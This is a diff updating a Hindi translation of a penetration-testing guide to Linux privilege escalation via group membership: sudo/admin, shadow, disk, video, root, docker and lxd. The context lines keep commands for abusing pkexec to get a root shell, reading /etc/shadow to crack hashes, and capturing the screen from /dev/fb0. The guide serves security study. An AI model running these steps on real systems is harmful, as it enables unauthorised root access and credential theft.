@@ -1,6 +1,5 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-
 # Sudo/Admin Groups
 
 ## **PE - Method 1**
@@ -21,11 +20,11 @@ sudo su
 ```
 ## PE - Method 2
 
-सभी suid बाइनरीज़ खोजें और जांचें कि क्या बाइनरी **Pkexec** है:
+सभी suid बाइनरी खोजें और जांचें कि क्या बाइनरी **Pkexec** है:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-यदि आप पाते हैं कि बाइनरी pkexec एक SUID बाइनरी है और आप sudo या admin में हैं, तो आप संभवतः pkexec का उपयोग करके sudo के रूप में बाइनरी निष्पादित कर सकते हैं। इसकी सामग्री की जांच करें:
+यदि आप पाते हैं कि बाइनरी pkexec एक SUID बाइनरी है और आप sudo या admin के सदस्य हैं, तो आप संभवतः pkexec का उपयोग करके sudo के रूप में बाइनरी निष्पादित कर सकते हैं। इसकी सामग्री की जांच करें:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -41,7 +40,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं बल्कि इसलिए है कि आप GUI के बिना जुड़े नहीं हैं**। और इस समस्या के लिए यहाँ एक समाधान है: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग ssh सत्र** की आवश्यकता है:
+**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं बल्कि इसलिए है कि आप GUI के बिना जुड़े नहीं हैं**। और इस समस्या का एक समाधान यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग ssh सत्र** की आवश्यकता है:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -66,11 +65,11 @@ sudo su
 ```
 # Shadow Group
 
-**शेडो समूह** के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़** सकते हैं:
+**शेडो** समूह के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़** सकते हैं:
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-तो, फ़ाइल पढ़ें और कुछ **हैश क्रैक करने** की कोशिश करें।
+तो, फ़ाइल को पढ़ें और कुछ **हैश क्रैक करने** की कोशिश करें।
 
 # डिस्क समूह
 
@@ -101,7 +100,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1** का मतलब है कि उपयोगकर्ता **yossi शारीरिक रूप से** मशीन पर एक टर्मिनल में लॉग इन है।
 
-**video group** को स्क्रीन आउटपुट देखने का अधिकार है। मूल रूप से आप स्क्रीन को देख सकते हैं। ऐसा करने के लिए, आपको **स्क्रीन पर वर्तमान छवि को** कच्चे डेटा में प्राप्त करना होगा और यह जानना होगा कि स्क्रीन किस रिज़ॉल्यूशन का उपयोग कर रही है। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन का रिज़ॉल्यूशन `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
+**वीडियो समूह** को स्क्रीन आउटपुट देखने का अधिकार है। मूल रूप से आप स्क्रीन को देख सकते हैं। ऐसा करने के लिए, आपको **स्क्रीन पर वर्तमान छवि को** कच्चे डेटा में प्राप्त करना होगा और यह जानना होगा कि स्क्रीन किस रिज़ॉल्यूशन का उपयोग कर रही है। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन का रिज़ॉल्यूशन `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -116,7 +115,7 @@ cat /sys/class/graphics/fb0/virtual_size
 
 # रूट समूह
 
-ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलों या कुछ **लाइब्रेरी** फ़ाइलों या **अन्य दिलचस्प चीजों** को **संशोधित** करने तक पहुँच सकते हैं, जिन्हें विशेषाधिकार बढ़ाने के लिए उपयोग किया जा सकता है...
+ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलों या कुछ **लाइब्रेरी** फ़ाइलों या **अन्य दिलचस्प चीजों** को **संशोधित** करने तक पहुँच सकते हैं जो विशेषाधिकार बढ़ाने के लिए उपयोग की जा सकती हैं...
 
 **जांचें कि रूट सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
 ```bash
@@ -126,13 +125,16 @@ find / -group root -perm -g=w 2>/dev/null
 
 आप होस्ट मशीन के रूट फ़ाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं, इसलिए जब इंस्टेंस शुरू होता है, तो यह तुरंत उस वॉल्यूम में `chroot` लोड करता है। यह प्रभावी रूप से आपको मशीन पर रूट देता है।
 
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+{{#ref}}
+https://github.com/KrustyHack/docker-privilege-escalation
+{{#endref}}
 
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+{{#ref}}
+https://fosterelli.co/privilege-escalation-via-docker.html
+{{#endref}}
 
 # lxc/lxd Group
 
 [lxc - Privilege Escalation](lxd-privilege-escalation.md)
-
 
 {{#include ../../banners/hacktricks-training.md}}
